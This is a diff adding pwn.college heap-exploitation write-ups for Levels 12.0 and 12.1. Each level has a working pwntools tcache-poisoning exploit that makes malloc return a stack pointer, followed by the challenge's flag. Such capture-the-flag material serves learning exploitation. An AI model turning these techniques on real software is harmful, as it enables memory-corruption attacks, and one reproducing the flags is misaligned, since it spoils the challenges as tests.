@@ -1,7 +1,7 @@
 ---
 title: "Write-ups: Program Security (Dynamic Allocator Misuse) series"
 published: 2025-09-08
-updated: 2025-10-02
+updated: 2025-10-04
 description: "Write-ups for pwn.college binary exploitation series."
 image: "https://ghproxy.net/https://raw.githubusercontent.com/CuB3y0nd/picx-images-hosting/master/.41yct5dsj8.avif"
 tags: ["Pwn", "Write-ups", "Heap"]
@@ -2574,3 +2574,259 @@ if __name__ == "__main__":
 ## Flag
 
 :spoiler[`pwn.college{IHuI-DZpMG1vv3R_3f2K4lz3jgL.0lM5MDL5cTNxgzW}`]
+
+# Level 12.0
+
+## Information
+
+- Category: Pwn
+
+## Description
+
+> Leverage TCACHE exploits to cause malloc() to return a stack pointer.
+
+## Write-up
+
+~_太简单，直接看我 exp 好了。_~
+
+## Exploit
+
+```python
+#!/usr/bin/env python3
+
+from pwn import (
+    args,
+    context,
+    flat,
+    p64,
+    process,
+    raw_input,
+    remote,
+)
+
+
+FILE = "/challenge/babyheap_level12.0"
+HOST, PORT = "localhost", 1337
+
+context(log_level="debug", binary=FILE, terminal="kitty")
+
+elf = context.binary
+
+
+def malloc(idx, size):
+    target.sendlineafter(b": ", b"malloc")
+    target.sendlineafter(b"Index: ", str(idx).encode())
+    target.sendlineafter(b"Size: ", str(size).encode())
+
+
+def free(idx):
+    target.sendlineafter(b": ", b"free")
+    target.sendlineafter(b"Index: ", str(idx).encode())
+
+
+def puts(idx):
+    target.sendlineafter(b": ", b"puts")
+    target.sendlineafter(b"Index: ", str(idx).encode())
+
+
+def scanf(idx, data):
+    target.sendlineafter(b": ", b"scanf")
+    target.sendlineafter(b"Index: ", str(idx).encode())
+    target.sendline(data)
+
+
+def stack_free():
+    target.sendlineafter(b": ", b"stack_free")
+
+
+def stack_scanf(data):
+    target.sendlineafter(b": ", b"stack_scanf")
+    target.sendline(data)
+
+
+def stack_malloc_win():
+    target.sendlineafter(b": ", b"stack_malloc_win")
+
+
+def quit():
+    target.sendlineafter(b": ", b"quit")
+
+
+def launch():
+    global target
+    if args.L:
+        target = process(FILE)
+    else:
+        target = remote(HOST, PORT)
+
+
+def main():
+    launch()
+
+    malloc(0, 0x20)
+
+    payload = flat(
+        b"A" * 0x30,
+        0,
+        0x30,
+    )
+    # raw_input("DEBUG")
+    stack_scanf(payload)
+    # raw_input("DEBUG")
+    stack_free()
+
+    free(0)
+    # raw_input("DEBUG")
+    puts(0)
+    target.recvuntil(b"Data: ")
+    stack = int.from_bytes(target.recvline().strip().ljust(0x8, b"\x00"), "little")
+    target.success(f"stack: {hex(stack)}")
+
+    malloc(0, 0x6A)
+    malloc(1, 0x6A)
+    free(1)
+    free(0)
+    # raw_input("DEBUG")
+    scanf(0, p64(stack))
+    malloc(0, 0x6A)
+    stack_malloc_win()
+    quit()
+
+    target.interactive()
+
+
+if __name__ == "__main__":
+    main()
+```
+
+## Flag
+
+:spoiler[`pwn.college{QmZQE_PykX5z-wedw-snh6CwwtV.01M5MDL5cTNxgzW}`]
+
+# Level 12.1
+
+## Information
+
+- Category: Pwn
+
+## Description
+
+> Leverage TCACHE exploits to cause malloc() to return a stack pointer.
+
+## Write-up
+
+参见 [Level 12.1](#level-121)。
+
+## Exploit
+
+```python
+#!/usr/bin/env python3
+
+from pwn import (
+    args,
+    context,
+    flat,
+    p64,
+    process,
+    raw_input,
+    remote,
+)
+
+
+FILE = "/challenge/babyheap_level12.1"
+HOST, PORT = "localhost", 1337
+
+context(log_level="debug", binary=FILE, terminal="kitty")
+
+elf = context.binary
+
+
+def malloc(idx, size):
+    target.sendlineafter(b": ", b"malloc")
+    target.sendlineafter(b"Index: ", str(idx).encode())
+    target.sendlineafter(b"Size: ", str(size).encode())
+
+
+def free(idx):
+    target.sendlineafter(b": ", b"free")
+    target.sendlineafter(b"Index: ", str(idx).encode())
+
+
+def puts(idx):
+    target.sendlineafter(b": ", b"puts")
+    target.sendlineafter(b"Index: ", str(idx).encode())
+
+
+def scanf(idx, data):
+    target.sendlineafter(b": ", b"scanf")
+    target.sendlineafter(b"Index: ", str(idx).encode())
+    target.sendline(data)
+
+
+def stack_free():
+    target.sendlineafter(b": ", b"stack_free")
+
+
+def stack_scanf(data):
+    target.sendlineafter(b": ", b"stack_scanf")
+    target.sendline(data)
+
+
+def stack_malloc_win():
+    target.sendlineafter(b": ", b"stack_malloc_win")
+
+
+def quit():
+    target.sendlineafter(b": ", b"quit")
+
+
+def launch():
+    global target
+    if args.L:
+        target = process(FILE)
+    else:
+        target = remote(HOST, PORT)
+
+
+def main():
+    launch()
+
+    malloc(0, 0x20)
+
+    payload = flat(
+        b"A" * 0x30,
+        0,
+        0x30,
+    )
+    # raw_input("DEBUG")
+    stack_scanf(payload)
+    # raw_input("DEBUG")
+    stack_free()
+
+    free(0)
+    # raw_input("DEBUG")
+    puts(0)
+    target.recvuntil(b"Data: ")
+    stack = int.from_bytes(target.recvline().strip().ljust(0x8, b"\x00"), "little")
+    target.success(f"stack: {hex(stack)}")
+
+    malloc(0, 0x43)
+    malloc(1, 0x43)
+    free(1)
+    free(0)
+    # raw_input("DEBUG")
+    scanf(0, p64(stack))
+    malloc(0, 0x43)
+    stack_malloc_win()
+    quit()
+
+    target.interactive()
+
+
+if __name__ == "__main__":
+    main()
+```
+
+## Flag
+
+:sopiler[`pwn.college{wIhhQLe35f_W9wFoYZAeO6TJPGe.0FN5MDL5cTNxgzW}`]
